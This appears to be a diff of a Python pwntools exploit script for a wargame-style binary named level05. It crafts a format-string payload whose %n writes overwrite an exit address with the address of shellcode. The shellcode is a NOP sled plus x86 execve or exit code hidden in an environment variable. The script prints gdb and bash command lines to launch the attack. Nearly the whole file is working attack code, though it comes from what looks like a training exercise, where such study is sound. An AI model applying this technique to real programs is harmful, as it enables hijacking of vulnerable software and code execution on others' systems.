@@ -1,37 +1,63 @@
 from pwn import *
 
 
+SHELLCODE_ADDRESS = 0xffffdbcd + len("PAYLOAD=") + 100
+
+
 def bytes_to_hex_string(data):
     payload = ''.join([f'\\x{x:02x}' for x in data])
     return payload
 
 
-def print_gcc_string(shellcode):
+def print_gcc_string(printf_pwn):
     gcc_string = r'run < <(printf "'
-    print(gcc_string + bytes_to_hex_string(shellcode) + '")')
+    print(gcc_string + bytes_to_hex_string(printf_pwn) + '")')
+    print()
+
+
+def print_bash_string(printf_pwn):
+
+    shell_string = "python -c 'print(b\""
+    env_end = f"\")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 PAYLOAD=$(python -c 'print b\"{(bytes_to_hex_string(create_payload()))}\"') DATA=/tmp/a /usr/bin/gdb /home/users/level05/level05"
+    print(env_end[6:])
+    print()
+    env_end = env_end.replace("/usr/bin/gdb ", '')
+    print(shell_string + bytes_to_hex_string(printf_pwn) + env_end)
 
 
 def create_payload():
-    buffer_start = 0xffffddac
     executable_path = b"/tmp/a"
-    asm_shellcode = """
-    mov    eax,0xb
-    mov    ebx,{executable_address}
+    padding = 1000
+    asm_shellcode = f"""
+        xor    ebx, ebx
+    mov    bx, 0x4301
+    dec    ebx
+    shl    ebx, 16
+    mov    bx, 0x612f
+    push   ebx
+    push   0x706d742f
+    xor    eax, eax
+    mov    al, 0xb
+    xor    ebx, ebx
+    lea    ebx, [esp]
     xor    ecx,ecx
-    mov    edx,ecx
+    xor    edx,edx
     int    0x80 
     """
-
-    data_area = executable_path + b'\x00'
-
-    # Start of executable will be needed to point to it in shellcode
-    executable_address = buffer_start
+    asm_shellcode = """
+    xor    ebx, ebx
+    xor    eax, eax
+    mov    al, 0x1
+    mov    bl, 42
+    int    0x80 
+    """
+    # TODO Shit above works only with exit. Need to solve what's wrong with execve
+    nops = b'\x90' * padding
     shellcode = asm(
-        asm_shellcode.format(executable_address=executable_address))
-    shellcode_address = buffer_start + len(data_area)
+        asm_shellcode)
+    return nops + shellcode + executable_path
 
-    payload = data_area + shellcode
-    print(len(payload))
+
 
 
 # Here we're creating string which will right DWORD in our exit address
@@ -41,7 +67,8 @@ w3 = b'\xe2\x97\x04\x08' + b'JUNK'
 w4 = b'\xe3\x97\x04\x08' + b'JUNK'
 
 # This is our final address
-b1, b2, b3, b4 = p32(0xdeadbeef)
+b1, b2, b3, b4 = p32(SHELLCODE_ADDRESS)
+# b1, b2, b3, b4 = p32(0xdeadbeef)
 
 # And this is our final address paddings
 n1 = 256 + b1 - 0x3e
@@ -58,6 +85,6 @@ position = 10
 fmt += b"%x" * (position - 2)
 # And now we're adding amount of symbols before %n to get desired address
 fmt += f'%{n1}x%n%{n2}x%n%{n3}x%n%{n4}x%n'.encode() + b"asdasdsadsa"
-print(f"len: {len(fmt)}")
+
 print_gcc_string(fmt)
-create_payload()
+print_bash_string(fmt)
